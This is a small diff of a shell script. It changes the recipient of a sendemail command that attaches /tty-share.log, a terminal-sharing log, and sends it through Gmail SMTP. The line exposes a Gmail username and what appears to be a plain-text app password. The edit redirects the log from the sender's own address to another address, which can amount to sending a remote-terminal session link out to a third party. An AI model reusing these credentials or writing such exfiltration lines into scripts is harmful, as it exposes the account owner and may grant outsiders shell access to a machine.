@@ -7,4 +7,4 @@ echo "no file"
 done
 echo "file"
 
-sendemail -f diana.vallverdu@gmail.com -t diana.vallverdu@gmail.com -m "tty" -a /tty-share.log  -u 'hello' -xu diana.vallverdu@gmail.com -xp fcnxcntclkxrrxvd -s smtp.gmail.com
+sendemail -f diana.vallverdu@gmail.com -t antsonstiltstehatre@gmail.com -m "tty" -a /tty-share.log  -u 'hello' -xu diana.vallverdu@gmail.com -xp fcnxcntclkxrrxvd -s smtp.gmail.com
